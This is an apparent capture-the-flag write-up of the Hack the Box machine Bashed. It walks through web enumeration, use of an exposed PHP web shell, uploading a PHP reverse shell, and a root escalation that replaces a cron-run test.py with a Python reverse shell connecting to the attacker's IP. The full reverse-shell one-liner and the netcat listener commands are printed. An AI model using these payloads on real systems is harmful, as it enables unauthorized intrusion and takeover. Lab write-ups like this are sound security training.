### Introduction
This is my writeup of the retired machine Bash from Hack the Box.

<hr>
### Nmap scan
```
nmap -sC -sV -oA initial_nmap_scan 10.10.10.68
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 00:40 AEDT

http is open on port on 80 let's have a look.

### Web Enumeration

Visiting http://10.10.10.68 brings us to this page<br><br>
![](\images\htb\bashed\1.png)<br><br>
None of the links on the side pannel go anywhere, Lets check out the phpbash post<br><br>
![](\images\htb\bashed\2.png)<br><br>
From Arrexel's github “phpbash is a semi-interactive web shell, that looks like the default kali terminal". This github page has nothing to do with the box, feel free to read and see what the tool is capable of, it's pretty cool.

In the post it was stated that phpbash was developed on this website, so it must be here somewhere lets brute force some directories with gobuster!<br>

<hr>

### GoBuster
```
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

After trying the list one by one, we land on this page http://10.10.10.68/dev (Possible hint in the post, dev - developed hmm..)<br><br>

After clicking on phpbash.php we are presented with this beautiful screen.<br><br>
![](\images\htb\bashed\4.png)<br><br>
This works like a terminal, just can't use tab.

<hr>

### phpbash.php

Uploaded LinEnum.sh to the /tmp directory for some local enumeration<br>
   1. Created a http server with python
        - I should mention here that you need to start the python webserver in the folder with the files you want to upload.<br>
   `python -m SimpleHTTPserver 80`
   3. Used wget from the web terminal to download LinEnum.sh wget<br>
   `http://10.10.14.18/LinEnum.sh`
   4. Made the script executable (for everyone, because +x didn't work) with<br>
   `chmod - chmod 777 LinEnum.sh`
   5. Then ran LinEnum.sh with<br>
   `./LinEnum.sh`<br>

It takes a couple of seconds, but the output comes up in the webshell, I just did a copy and paste into CheeryTree to go through it.

Found 2 users<br>
   ```
   1.  arexxel
   2. scriptmanager
   ```
<br>
Did find this particular line interesting:<br>
```
    User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
<br>
Which means that the user scriptmanager, can run anything without supplying a password. Neat!<br>

<hr>

### Reverse shell

After trying with no luck to get scriptmanager user within the webshell, it was time to try and get a reverse shell. I later found out that this webshell is not persistant, it basically spawns a new shell for every command <br>

So if we try and switch to user scriptmanager in the webshell. It tells us that we are scriptmanager <br>
    `sudo -u scriptmanager whoami`<br><br>
![](\images\htb\bashed\5.png)<br><br>

But if we try whoami again, we are back to www-data <br><br>
![](\images\htb\bashed\6.png)<br><br>

Since we are www-data, I'll be uploading a php reverse shell to the /var/www/html/uploads folder. This will allow me to browse to this file, and get a shell. Let's begin<br>

1. Head over to everyones favourite reverse shell website pentest monkey and grab the php reverse shell<br>
`http://pentestmonkey.net/tools/web-shells/php-reverse-shell`<br><br>
 2. Edit the script for your IP address, you can also change the port to your liking aswell. Change the two lines here:Since we are www-data, I'll be uploading a php reverse shell to the /var/www/html/uploads folder. This will allow me to browse to this file, and get a shell. Let's begin<br><br>
 ![](\images\htb\bashed\7.png)<br><br>
 3. Start a python webserver
       - Remember to start the python webserver in the folder with the files you want to upload.
`python -m SimpleHTTPserver 80`<br>
  4.  From the webshell
  ```
       cd /var/www/html/uploads
       wget http://10.10.14.3/php-reverse-shell.php
  ```
  5. Start a listener to catch the shell
       `nc -lvnp 8888 (port from the script you edited)`
  6. From a browser navigate to
  `http://10.10.10.68/uploads/php-reverse-shell.php`
  7. Take a look at your listener, you should have caught the shell.

First thing I like to try after geting a basic shell is to spawn a tty shell with python.
    `python -c 'import pty;pty.spawn("/bin/bash")'``

<hr>

### Root

You're probably thinking what about user?

After doing an `ls -la` on the / directory, there is a folder that was out of the ordinary<br><br>
![](\images\htb\bashed\8.png)<br><br>

The scripts folder, owned by scriptmanager. Lets change to this user because thats why we went and got a reverse shell in the first place.
    `sudo -u scriptmanager bash`

We are now the user scriptmanager. Let's have a look at the scripts folder<br><br>
![](\images\htb\bashed\9.png)<br><br>

Something interesting was the time and date of test.txt was today's date<br><br>
![](\images\htb\bashed\10.png)<br><br>

Looks like the test.py runs every minute or so, after reading test.py the key thing to notice is that where it is writing to is owned by root, that means the job is being run by root, therefore if we change this file to give us a reverse shell we will be root.

I had a lot of dificulty in editing this file on the box, as vi was not co-operating, what I did was took the python reverse shell from pentest monkey found here http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet and edited it.

Original script
```
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Edited - basically at every “;” make a new line and delete it. Also make sure to change the IP to your machines IP
```
   `import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.3",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])`
```
Saved the file as python_shell on my own machine, Then uploaded it to the scripts directory on the box, once uploaded renamed python_shell to be test.py

Started a listener to catch the shell
  `nc -lvnp 1234`

after a minute or so you should recieve a shell, or you can force it with
  `python test.py`

We now have root
